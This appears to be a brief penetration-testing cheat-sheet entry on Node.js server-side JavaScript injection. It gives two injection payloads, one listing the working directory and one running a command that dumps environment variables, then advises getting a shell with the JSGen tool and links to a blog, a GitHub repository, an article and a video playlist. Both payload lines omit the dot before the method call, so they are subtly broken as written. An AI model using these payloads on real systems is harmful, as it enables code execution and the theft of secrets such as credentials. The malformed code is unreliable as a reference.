**Payloads:**

```
res.end(require('fs')readdirSync('.').toString())
res.end(require('child_process')execSync('env').toString())

```
### If this works, use JSGen to get shell
<https://pentesterslife.blog/2018/06/28/jsgen/>
<https://github.com/S3cur3Th1sSh1t/SSJI---JSGen>
<https://blog.gdssecurity.com/labs/2015/4/15/nodejs-server-side-javascript-injection-detection-exploitati.html>
<https://www.youtube.com/watch?v=qFHlt9CHC0I&list=PLIbCFt2m6LvIKx64BiAL32Mbxb1P6GtEg>
